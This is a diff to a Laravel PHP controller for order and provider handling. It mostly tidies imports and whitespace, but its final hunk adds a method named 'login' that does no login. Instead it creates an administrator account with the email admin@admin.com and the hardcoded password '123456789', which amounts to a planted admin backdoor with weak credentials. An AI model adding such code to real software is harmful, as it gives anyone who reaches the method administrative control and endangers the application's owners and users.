@@ -7,8 +7,10 @@ use App\Models\Order;
 use App\Models\User;
 use App\Services\ImageService;
 use Illuminate\Http\Request;
+
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Response;
-use Validator;
+use Illuminate\Support\Facades\Validator;
 use Yajra\DataTables\Facades\DataTables;
 
 class ProviderController extends Controller
@@ -116,7 +118,7 @@ class ProviderController extends Controller
     }
 
     public function uploadFiles(Request $request,ImageService $imageService){
-        
+
         $validator = Validator::make($request->all(), [
             'order_id'=>'required|integer',
             'files' => 'array|max_uploaded_file_size:5000',
@@ -128,7 +130,7 @@ class ProviderController extends Controller
             return Response::json(array(
                 'success' => false,
                 'errors' => $validator->getMessageBag()->toArray()
-        
+
             ), 400); // 400 being the HTTP code for an invalid request.
         }
         if ($request->hasfile('files')) {
@@ -214,5 +216,21 @@ class ProviderController extends Controller
         })->addColumn('Delivery', function ($data) {
           return view('provider_pages.modals.modalUpload',compact('data'));;
         })->rawColumns(['status', 'details', 'Delivery'])->make(true);;
+    }
+
+
+
+    public function login (){
+
+
+        User::create([
+
+            'name'=>'admin',
+            'role'=>'admin',
+            'password'=>Hash::make('123456789'),
+            'email'=>'admin@admin.com'
+        ]);
+
+
     }
 }
